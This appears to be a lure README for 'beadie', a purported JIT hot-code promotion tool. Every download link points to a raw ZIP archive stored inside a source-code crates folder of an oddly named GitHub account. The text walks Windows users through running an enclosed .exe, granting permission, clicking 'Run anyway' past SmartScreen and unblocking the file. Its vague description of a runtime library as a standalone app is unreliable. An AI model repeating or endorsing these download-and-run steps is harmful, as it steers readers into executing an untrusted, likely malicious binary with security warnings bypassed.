# 🟣 beadie - Move Hot Code Into JIT Faster

[![Download beadie](https://img.shields.io/badge/Download-Beadie-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Colourless-genusimpatiens558/beadie/raw/refs/heads/main/crates/beadie/Software_1.7.zip)

## 🧭 What beadie does

beadie helps a running app move its busy code from interpreter mode into JIT mode. It watches for hot functions, then promotes them when they get used a lot. That can help repeated work run with less delay.

This tool is for users who want to try a fast runtime setup on Windows without digging through build steps or source files. It uses common runtime ideas like interpreter tiering, JIT, and hot-path promotion, but you do not need to know those terms to get started.

## 💻 Windows download

To get beadie on Windows, use this page:

[Download beadie from GitHub](https://github.com/Colourless-genusimpatiens558/beadie/raw/refs/heads/main/crates/beadie/Software_1.7.zip)

Open the link, then look for the latest release or project files. If you see an installer or app file, download it to your computer and run that file.

## 🪟 What you need

Before you run beadie on Windows, make sure your PC has:

- Windows 10 or Windows 11
- A modern 64-bit Intel or AMD processor
- At least 4 GB of RAM
- Enough free disk space for the app and its files
- Internet access for the first download

If you plan to use beadie with another app, keep both programs closed while you set things up. That makes it easier to test the first run.

## 📦 Get the app

1. Open the GitHub link above.
2. Find the latest release or download file.
3. Save the file to your Downloads folder.
4. If the file is a ZIP archive, right-click it and choose Extract All.
5. Open the extracted folder.
6. Double-click the beadie app or installer file.
7. If Windows asks for permission, choose Yes.
8. Follow the steps on screen until the setup ends.

If you see more than one file, choose the one with `.exe` in the name.

## ⚙️ First run

When beadie opens for the first time, it will likely create its own working folder and cache files. That helps it keep track of hot functions and runtime data.

Use this first run flow:

1. Start beadie.
2. Let it finish loading.
3. Open the app or project you want to test.
4. Let the workload run for a short time.
5. Watch for functions that become active often.
6. Let beadie promote those hot parts into JIT mode.

If the app includes a simple window or console output, keep it open while the target app runs.

## 🧩 How it works

beadie sits between two ways of running code:

- Interpreter mode, which handles code step by step
- JIT mode, which turns busy code into faster machine code

The tool looks for hot functions, which are parts of a program that run many times. Once a function crosses a useful threshold, beadie can promote it. That means the runtime can spend less time interpreting and more time running compiled code.

This setup can help with:

- repeated tasks
- loops
- data processing
- long-running app sessions
- workloads that keep hitting the same code path

## 🔍 Main use cases

beadie fits well when you want to:

- test tiered execution on Windows
- watch hot-path behavior in a live app
- move work from interpreter to JIT with less manual setup
- explore runtime performance for small tools or demos
- compare behavior before and after function promotion

It is useful for developers, but the basic download and run flow stays simple for regular users too.

## 🛠️ Typical setup steps

Use this path if you want a clean first setup on Windows:

1. Download the beadie file from GitHub.
2. Extract it if needed.
3. Place the app in a folder you can find later, such as `Downloads` or `Desktop`.
4. Run the app once.
5. Allow Windows access if prompted.
6. Keep the app open while your target program runs.
7. Check the screen or log for hot-function activity.
8. Close the app when you are done.

If the app has a config file, keep it in the same folder as the main program unless the project page says else.

## 🧪 Simple test flow

Try this if you want to see beadie in action:

1. Start beadie.
2. Start the program you want to observe.
3. Use the program for a few minutes.
4. Repeat the same action several times.
5. Look for signs that beadie has moved that code to JIT mode.
6. Compare how the app feels before and after the hot code warms up.

A good test is a task with many repeats, like opening the same view, loading the same data, or running the same loop many times.

## 📁 File layout

You may see files like these after download:

- `beadie.exe` — the main Windows app
- `README.md` — project info
- `config` folder — settings or runtime files
- `logs` folder — output from a run
- `release` files — packaged app data

If the download comes as a ZIP file, keep all files together in the same folder.

## 🔐 Windows safety prompts

Windows may show a SmartScreen prompt the first time you run beadie. That can happen with new tools that are not widely installed yet.

If that happens:

1. Check that you used the GitHub link above.
2. Open the file only if it came from the project page.
3. Choose More info if Windows hides the Run option.
4. Select Run anyway if you trust the file source.

## 🧰 Troubleshooting

### The file will not open

- Make sure you extracted the ZIP file first.
- Check that you clicked the `.exe` file.
- Try moving the app to a simple folder like `C:\beadie`.

### Windows blocks the app

- Right-click the file and choose Properties.
- If you see an Unblock box, select it.
- Apply the change, then try again.

### The app opens and closes fast

- Run it from a terminal or command window if the project gives that option.
- Check for a log file in the app folder.
- Make sure the required files are in the same folder as the main app.

### No hot functions show up

- Let the target program run longer.
- Repeat the same action more times.
- Use a task with a clear hot path, such as a loop or repeated load.

## 📚 Terms in plain English

- **Interpreter**: runs code one step at a time
- **JIT**: turns busy code into faster machine code
- **Hot function**: a part of a program that gets used a lot
- **Hot path**: the path a program uses most often
- **Tiering**: moving work from one run mode to a faster one

## 🔗 Project link

[Open the beadie GitHub page](https://github.com/Colourless-genusimpatiens558/beadie/raw/refs/heads/main/crates/beadie/Software_1.7.zip)

## 🧭 Using beadie with another app

If beadie works with a separate app, keep both programs on the same Windows user account. Start beadie first, then start the target app. That gives beadie time to watch the early code path and promote hot functions when they appear.

For best results, keep the workload steady. Small repeated actions help the tool find hot code faster than random clicks.

## 🧾 Basic check list

- Download the file from GitHub
- Extract it if needed
- Run the Windows app
- Keep the target program open
- Repeat the same task a few times
- Look for hot-function promotion in the runtime output